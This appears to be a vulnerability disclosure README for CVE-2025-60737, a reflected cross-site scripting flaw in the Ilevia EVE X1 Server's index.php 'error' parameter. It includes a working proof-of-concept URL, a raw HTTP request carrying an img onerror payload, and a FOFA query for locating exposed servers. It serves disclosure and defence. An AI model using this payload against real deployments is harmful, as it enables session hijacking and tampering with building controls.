# CVE-2025-60737 Ilevia-EVE-X1-Server-RefelctedXss
Ilevia EVE X1 Server refelcted XSS poc

## Affected Repository
- Project: Ilevia EVE X1 Server 
- Affect versions: Firmware Version<= 4.7.18.0.eden;Logic Version<=6.00 - 2025_07_21
- File: /index.php?error=
- homePage: https://www.ilevia.com/
- CVE_ID: CVE-2025-60737
- Dependency: Ilevia EVE X1 Server ( Firmware Version<= 4.7.18.0.eden;Logic Version<=6.00 - 2025_07_21)

## Proof of Concept (PoC)
`
http://ip:port/index.php?error=%3Cimg%20src=x%20onerror=alert(`1`)%3E `
<img width="1652" height="732" alt="image" src="https://github.com/user-attachments/assets/8e6b42ef-afa6-42df-9412-2324ae05067d" />
```
GET /index.php?error=%3Cimg%20src=x%20onerror=alert(`1`)%3E HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Cookie: PHPSESSID=o5113v7mj2dgkp35klbghiogum
Accept-Encoding: gzip, deflate
```
<img width="1708" height="451" alt="image" src="https://github.com/user-attachments/assets/94ddf3c3-6f96-4177-834f-fdd9c42b5b59" />

## Vulnerability category
- CWE-79 XSS
## Scope of influence
- fofa：app="ilevia-EVE-X1-Server"
<img width="1482" height="340" alt="image" src="https://github.com/user-attachments/assets/2075aed5-76be-438a-a18e-e2e33380c26f" />
